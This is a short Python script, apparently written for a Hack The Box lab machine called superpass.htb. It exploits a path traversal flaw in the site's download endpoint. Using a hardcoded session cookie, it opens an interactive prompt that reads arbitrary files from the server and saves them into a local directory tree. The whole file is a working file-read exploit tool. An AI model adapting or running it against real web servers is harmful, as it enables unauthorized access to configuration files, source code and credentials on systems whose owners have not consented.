import requests
import os
from cmd import Cmd
from bs4 import BeautifulSoup

url = "http://superpass.htb/download?fn=..{file}"
session = requests.Session()
cookies = {'session': '.eJwlzjEOwzAIQNG7MHcAArbJZSIDtto1aaaqd6-ljk9_-R845jmuJ-zv8x4POF4JO1RFVWQfGYVtThookWGja_HNvUyl3mtV8QjDxa1O9RWL9SpYMHOZyJu1gi1JtbM3KmKkgiLNnGYYS-dJVDV7TQ4hCVNlWCP3Nc7_jcH3B7gDLoA.ZJ4cyw.AXjgLUzc88yR17sdlWzeDfgOGaA'}
session.cookies = requests.utils.cookiejar_from_dict(cookies)
class Term(Cmd):
    prompt = "-> "
    def default(self, args):
        do_run(args)
def do_run(file):
    if file.startswith('download'):
        print(f'Downloading {file.split(" ")[1]}')
        return download(file.split(' ')[1])
    request = session.get(url.format(file=file))
    if request.status_code == 200:
        print(request.text)
        return request
    else:
        print(f'Error [{request.status_code}]')
        soup = BeautifulSoup(request.text, 'html.parser')
        title = soup.find('title')
        print(title)
    return request
def download(file):
    path = os.path.dirname(file)
    # Crear directorio para almacenar los archivos
    root = os.getcwd() + '/files'
    if os.path.isfile(root):
        print(f'Error, remove or rename {root}')
        return 1
    elif not os.path.exists(root):
        os.mkdir(root)
    request = session.get(url.format(file=file))
    if request.status_code == 200:
        dir_path = root + os.path.dirname(file)
        os.makedirs(dir_path, exist_ok=True)
        with open(root + file, 'wb') as f:
            f.write(request.content)
    return request
    
if __name__ == '__main__':
    term = Term()
    term.cmdloop()